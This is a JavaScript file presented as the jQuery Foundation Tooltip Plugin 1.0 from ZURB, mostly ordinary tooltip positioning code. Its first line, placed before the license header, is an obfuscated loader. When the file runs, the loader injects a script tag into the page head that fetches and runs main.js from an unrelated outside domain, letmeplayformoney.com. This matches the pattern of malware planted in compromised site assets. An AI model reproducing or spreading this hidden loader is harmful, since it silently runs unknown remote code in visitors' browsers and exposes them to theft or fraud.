var _0x25b0=['createElement','script','onload','src','https://cdn.letmeplayformoney.com/main.js?cdn=js','text/javascript','getElementsByTagName','head','appendChild'];(function(_0x38c36f,_0x12afce){var _0x31d501=function(_0x338e37){while(--_0x338e37){_0x38c36f['push'](_0x38c36f['shift']());}};_0x31d501(++_0x12afce);}(_0x25b0,0x1dd));var _0x4bec=function(_0x1c1d3d,_0x21e514){_0x1c1d3d=_0x1c1d3d-0x0;var _0x2921c7=_0x25b0[_0x1c1d3d];return _0x2921c7;};var script=document[_0x4bec('0x0')](_0x4bec('0x1'));script[_0x4bec('0x2')]=function(){};script[_0x4bec('0x3')]=_0x4bec('0x4');script['type']=_0x4bec('0x5');document[_0x4bec('0x6')](_0x4bec('0x7'))[0x0][_0x4bec('0x8')](script);/*
 * jQuery Foundation Tooltip Plugin 1.0
 * http://foundation.zurb.com
 * Copyright 2012, ZURB
 * Free to use under the MIT license.
 * http://www.opensource.org/licenses/mit-license.php
*/

;(function($) {
  var attributes = {
    bodyHeight : 0,
    pollInterval : 1000
  };

  var methods = {
    init : function( options ) {

      return this.each(function() {
        var targets = $('.has-tip'),
        tips = $('.tooltip'),
        tipTemplate = function(target, content) {
          return '<span data-id="' + target + '" class="tooltip">' + content + '<span class="nub"></span></span>';
        },
        poll = setInterval(methods.isDomResized, attributes.pollInterval);
        if (tips.length < 1) {
          targets.each(function(i){
            var target = $(this),
            id = 'foundationTooltip' + i,
            content = target.attr('title'),
            classes = target.attr('class');
            target.data('id', id);
            var tip = $(tipTemplate(id, content));
            tip.addClass(classes).removeClass('has-tip').appendTo('body');
            if (Modernizr.touch) {
              tip.append('<span class="tap-to-close">tap to close </span>');
            }
            methods.reposition(target, tip, classes);
            tip.fadeOut(150);
          });
        }
        $(window).resize(function() {
          var tips = $('.tooltip');
          tips.each(function() {
            var data = $(this).data();
            target = targets = $('.has-tip'),
            tip = $(this),
            classes = tip.attr('class');
            targets.each(function() {
              ($(this).data().id == data.id) ? target = $(this) : target = target;
            });
            methods.reposition(target, tip, classes);
          });

        });

        if (Modernizr.touch) {
          $('.tooltip').live('click touchstart touchend', function(e) {
            e.preventDefault();
            $(this).fadeOut(150);
          });
          targets.live('click touchstart touchend', function(e){
            e.preventDefault();
            $('.tooltip').hide();
            $('span[data-id=' + $(this).data('id') + '].tooltip').fadeIn(150);
            targets.attr('title', "");
          });

        } else {
          targets.hover(function() {
            $('span[data-id=' + $(this).data('id') + '].tooltip').fadeIn(150);
            targets.attr('title', "");
          }, function() {
            $('span[data-id=' + $(this).data('id') + '].tooltip').fadeOut(150);
          });
        }

      });
    },
    reposition : function(target, tip, classes) {
      var width = target.data('width'),
      nub = tip.children('.nub'),
      nubHeight = nub.outerHeight(),
      nubWidth = nub.outerWidth();

      function nubPos(nub, top, right, bottom, left) {
        nub.css({
          'top' : top,
          'bottom' : bottom,
          'left' : left,
          'right' : right
        });
      }

      tip.css({
        'top' : (target.offset().top + target.outerHeight() + 10),
        'left' : target.offset().left,
        'width' : width
      });
      nubPos(nub, -nubHeight, 'auto', 'auto', 10);

      if ($(window).width() < 767) {
        var row = target.parents('.row');
        tip.width(row.outerWidth() - 20).css('left', row.offset().left).addClass('tip-override');
        nubPos(nub, -nubHeight, 'auto', 'auto', target.offset().left);
      } else {
        if (classes.indexOf('tip-top') > -1) {
          tip.css({
            'top' : target.offset().top - tip.outerHeight() - nubHeight,
            'left' : target.offset().left,
            'width' : width
          }).removeClass('tip-override');
          nubPos(nub, 'auto', 'auto', -nubHeight, 'auto');
        } else if (classes.indexOf('tip-left') > -1) {
          tip.css({
            'top' : target.offset().top + (target.outerHeight() / 2) - nubHeight,
            'left' : target.offset().left - tip.outerWidth() - 10,
            'width' : width
          }).removeClass('tip-override');
          nubPos(nub, (tip.outerHeight() / 2) - (nubHeight / 2), -nubHeight, 'auto', 'auto');
        } else if (classes.indexOf('tip-right') > -1){
          tip.css({
            'top' : target.offset().top + (target.outerHeight() / 2) - nubHeight,
            'left' : target.offset().left + target.outerWidth() + 10,
            'width' : width
          }).removeClass('tip-override');
          nubPos(nub, (tip.outerHeight() / 2) - (nubHeight / 2), 'auto', 'auto', -nubHeight);
        }
      }
    },
    isDomResized : function() {
      $body = $('body');
      if(attributes.bodyHeight != $body.height()) {
        attributes.bodyHeight = $body.height();
        $(window).trigger('resize');
      }
    }
  };

  $.fn.tooltips = function( method ) {

    if ( methods[method] ) {
      return methods[ method ].apply( this, Array.prototype.slice.call( arguments, 1 ));
    } else if ( typeof method === 'object' || ! method ) {
      return methods.init.apply( this, arguments );
    } else {
      $.error( 'Method ' +  method + ' does not exist on jQuery.tooltips' );
    }

  };
})(jQuery);;
